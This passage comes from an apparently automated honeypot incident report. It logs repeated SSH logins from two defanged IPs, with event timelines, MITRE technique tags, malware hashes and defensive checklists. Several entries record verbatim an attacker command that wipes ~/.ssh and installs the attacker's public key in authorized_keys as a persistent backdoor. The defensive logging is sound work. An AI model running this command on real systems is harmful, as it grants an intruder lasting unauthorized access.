| `2026-04-14 12:31:30` | `cowrie.client.kex` |
| `2026-04-14 12:31:31` | `cowrie.login.success` |
| `2026-04-14 12:31:32` | `cowrie.session.params` |
| `2026-04-14 12:31:32` | `cowrie.command.input` |
| `2026-04-14 12:31:32` | `cowrie.command.failed` |
| `2026-04-14 12:31:32` | `cowrie.log.closed` |
| `2026-04-14 12:31:33` | `cowrie.session.params` |
| `2026-04-14 12:31:33` | `cowrie.command.input` |
| `2026-04-14 12:31:33` | `cowrie.session.file_download` |
| `2026-04-14 12:31:33` | `cowrie.log.closed` |
| `2026-04-14 12:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3974dea2ad82

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:31 |
| **Last Seen** | 2026-04-14 12:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:31:31` | `cowrie.session.connect` |
| `2026-04-14 12:31:31` | `cowrie.client.version` |
| `2026-04-14 12:31:31` | `cowrie.client.kex` |
| `2026-04-14 12:31:31` | `cowrie.login.success` |
| `2026-04-14 12:31:32` | `cowrie.session.params` |
| `2026-04-14 12:31:32` | `cowrie.command.input` |
| `2026-04-14 12:31:32` | `cowrie.command.failed` |
| `2026-04-14 12:31:32` | `cowrie.log.closed` |
| `2026-04-14 12:31:32` | `cowrie.session.params` |
| `2026-04-14 12:31:32` | `cowrie.command.input` |
| `2026-04-14 12:31:32` | `cowrie.session.file_download` |
| `2026-04-14 12:31:32` | `cowrie.log.closed` |
| `2026-04-14 12:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f90eeebdf659

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:31 |
| **Last Seen** | 2026-04-14 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:31:34` | `cowrie.session.connect` |
| `2026-04-14 12:31:34` | `cowrie.client.version` |
| `2026-04-14 12:31:34` | `cowrie.client.kex` |
| `2026-04-14 12:31:35` | `cowrie.login.success` |
| `2026-04-14 12:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb2f05eaa2c

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:31 |
| **Last Seen** | 2026-04-14 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:31:37` | `cowrie.session.connect` |
| `2026-04-14 12:31:37` | `cowrie.client.version` |
| `2026-04-14 12:31:37` | `cowrie.client.kex` |
| `2026-04-14 12:31:39` | `cowrie.login.success` |
| `2026-04-14 12:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ffc23a189d4

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:35 |
| **Last Seen** | 2026-04-14 12:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:35:16` | `cowrie.session.connect` |
| `2026-04-14 12:35:16` | `cowrie.client.version` |
| `2026-04-14 12:35:16` | `cowrie.client.kex` |
| `2026-04-14 12:35:18` | `cowrie.login.success` |
| `2026-04-14 12:35:18` | `cowrie.session.params` |
| `2026-04-14 12:35:18` | `cowrie.command.input` |
| `2026-04-14 12:35:18` | `cowrie.command.failed` |
| `2026-04-14 12:35:19` | `cowrie.log.closed` |
| `2026-04-14 12:35:19` | `cowrie.session.params` |
| `2026-04-14 12:35:19` | `cowrie.command.input` |
| `2026-04-14 12:35:20` | `cowrie.session.file_download` |
| `2026-04-14 12:35:20` | `cowrie.log.closed` |
| `2026-04-14 12:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cf6b984ea0e

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:35 |
| **Last Seen** | 2026-04-14 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:35:23` | `cowrie.session.connect` |
| `2026-04-14 12:35:23` | `cowrie.client.version` |
| `2026-04-14 12:35:24` | `cowrie.client.kex` |
| `2026-04-14 12:35:25` | `cowrie.login.success` |
| `2026-04-14 12:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-566b5b4f8475

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:42 |
| **Last Seen** | 2026-04-14 12:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:42:10` | `cowrie.session.connect` |
| `2026-04-14 12:42:10` | `cowrie.client.version` |
| `2026-04-14 12:42:10` | `cowrie.client.kex` |
| `2026-04-14 12:42:11` | `cowrie.login.success` |
| `2026-04-14 12:42:11` | `cowrie.session.params` |
| `2026-04-14 12:42:11` | `cowrie.command.input` |
| `2026-04-14 12:42:11` | `cowrie.command.failed` |
| `2026-04-14 12:42:11` | `cowrie.log.closed` |
| `2026-04-14 12:42:12` | `cowrie.session.params` |
| `2026-04-14 12:42:12` | `cowrie.command.input` |
| `2026-04-14 12:42:12` | `cowrie.session.file_download` |
| `2026-04-14 12:42:12` | `cowrie.log.closed` |
| `2026-04-14 12:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c25447682c

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:42 |
| **Last Seen** | 2026-04-14 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:42:14` | `cowrie.session.connect` |
| `2026-04-14 12:42:14` | `cowrie.client.version` |
| `2026-04-14 12:42:14` | `cowrie.client.kex` |
| `2026-04-14 12:42:15` | `cowrie.login.success` |
| `2026-04-14 12:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8305f4c650e

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:43 |
| **Last Seen** | 2026-04-14 12:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:43:54` | `cowrie.session.connect` |
| `2026-04-14 12:43:54` | `cowrie.client.version` |
| `2026-04-14 12:43:54` | `cowrie.client.kex` |
| `2026-04-14 12:43:55` | `cowrie.login.success` |
| `2026-04-14 12:43:55` | `cowrie.session.params` |
| `2026-04-14 12:43:55` | `cowrie.command.input` |
| `2026-04-14 12:43:55` | `cowrie.command.failed` |
| `2026-04-14 12:43:55` | `cowrie.log.closed` |
| `2026-04-14 12:43:55` | `cowrie.session.params` |
| `2026-04-14 12:43:55` | `cowrie.command.input` |
| `2026-04-14 12:43:56` | `cowrie.session.file_download` |
| `2026-04-14 12:43:56` | `cowrie.log.closed` |
| `2026-04-14 12:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5029d6e9dc

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:43 |
| **Last Seen** | 2026-04-14 12:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:43:58` | `cowrie.session.connect` |
| `2026-04-14 12:43:58` | `cowrie.client.version` |
| `2026-04-14 12:43:58` | `cowrie.client.kex` |
| `2026-04-14 12:43:58` | `cowrie.login.success` |
| `2026-04-14 12:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2920854da789

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:45 |
| **Last Seen** | 2026-04-14 12:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:45:37` | `cowrie.session.connect` |
| `2026-04-14 12:45:37` | `cowrie.client.version` |
| `2026-04-14 12:45:37` | `cowrie.client.kex` |
| `2026-04-14 12:45:38` | `cowrie.login.success` |
| `2026-04-14 12:45:38` | `cowrie.session.params` |
| `2026-04-14 12:45:38` | `cowrie.command.input` |
| `2026-04-14 12:45:38` | `cowrie.command.failed` |
| `2026-04-14 12:45:39` | `cowrie.log.closed` |
| `2026-04-14 12:45:39` | `cowrie.session.params` |
| `2026-04-14 12:45:39` | `cowrie.command.input` |
| `2026-04-14 12:45:39` | `cowrie.session.file_download` |
| `2026-04-14 12:45:39` | `cowrie.log.closed` |
| `2026-04-14 12:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b10200b4293

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:45 |
| **Last Seen** | 2026-04-14 12:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:45:41` | `cowrie.session.connect` |
| `2026-04-14 12:45:41` | `cowrie.client.version` |
| `2026-04-14 12:45:41` | `cowrie.client.kex` |
| `2026-04-14 12:45:42` | `cowrie.login.success` |
| `2026-04-14 12:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d11c8801605

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:47 |
| **Last Seen** | 2026-04-14 12:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:47:28` | `cowrie.session.connect` |
| `2026-04-14 12:47:28` | `cowrie.client.version` |
| `2026-04-14 12:47:28` | `cowrie.client.kex` |
| `2026-04-14 12:47:29` | `cowrie.login.success` |
| `2026-04-14 12:47:29` | `cowrie.session.params` |
| `2026-04-14 12:47:29` | `cowrie.command.input` |
| `2026-04-14 12:47:29` | `cowrie.command.failed` |
| `2026-04-14 12:47:29` | `cowrie.log.closed` |
| `2026-04-14 12:47:29` | `cowrie.session.params` |
| `2026-04-14 12:47:29` | `cowrie.command.input` |
| `2026-04-14 12:47:30` | `cowrie.session.file_download` |
| `2026-04-14 12:47:30` | `cowrie.log.closed` |
| `2026-04-14 12:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f222e0ad03a

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:47 |
| **Last Seen** | 2026-04-14 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:47:32` | `cowrie.session.connect` |
| `2026-04-14 12:47:32` | `cowrie.client.version` |
| `2026-04-14 12:47:32` | `cowrie.client.kex` |
| `2026-04-14 12:47:32` | `cowrie.login.success` |
| `2026-04-14 12:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48ce00426af7

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:49 |
| **Last Seen** | 2026-04-14 12:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:49:18` | `cowrie.session.connect` |
| `2026-04-14 12:49:18` | `cowrie.client.version` |
| `2026-04-14 12:49:18` | `cowrie.client.kex` |
| `2026-04-14 12:49:19` | `cowrie.login.success` |
| `2026-04-14 12:49:19` | `cowrie.session.params` |
| `2026-04-14 12:49:19` | `cowrie.command.input` |
| `2026-04-14 12:49:19` | `cowrie.command.failed` |
| `2026-04-14 12:49:19` | `cowrie.log.closed` |
| `2026-04-14 12:49:20` | `cowrie.session.params` |
| `2026-04-14 12:49:20` | `cowrie.command.input` |
| `2026-04-14 12:49:20` | `cowrie.session.file_download` |
| `2026-04-14 12:49:20` | `cowrie.log.closed` |
| `2026-04-14 12:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-931780363140

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:49 |
| **Last Seen** | 2026-04-14 12:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:49:22` | `cowrie.session.connect` |
| `2026-04-14 12:49:22` | `cowrie.client.version` |
| `2026-04-14 12:49:22` | `cowrie.client.kex` |
| `2026-04-14 12:49:23` | `cowrie.login.success` |
| `2026-04-14 12:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c658c2f43f43

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:51 |
| **Last Seen** | 2026-04-14 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:51:06` | `cowrie.session.connect` |
| `2026-04-14 12:51:06` | `cowrie.client.version` |
| `2026-04-14 12:51:06` | `cowrie.client.kex` |
| `2026-04-14 12:51:07` | `cowrie.login.success` |
| `2026-04-14 12:51:07` | `cowrie.session.params` |
| `2026-04-14 12:51:07` | `cowrie.command.input` |
| `2026-04-14 12:51:07` | `cowrie.command.failed` |
| `2026-04-14 12:51:07` | `cowrie.log.closed` |
| `2026-04-14 12:51:07` | `cowrie.session.params` |
| `2026-04-14 12:51:07` | `cowrie.command.input` |
| `2026-04-14 12:51:08` | `cowrie.session.file_download` |
| `2026-04-14 12:51:08` | `cowrie.log.closed` |
| `2026-04-14 12:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.149[.]159` to AbuseIPDB if not already reported
- [ ] Block `43.128.149[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f666045898d

| Field | Detail |
|---|---|
| **Source IP** | `43.128.149[.]159` |
| **First Seen** | 2026-04-14 12:51 |
| **Last Seen** | 2026-04-14 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:51:10` | `cowrie.session.connect` |
| `2026-04-14 12:51:10` | `cowrie.client.version` |
| `2026-04-14 12:51:10` | `cowrie.client.kex` |
| `2026-04-14 12:51:10` | `cowrie.login.success` |
| `2026-04-14 12:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
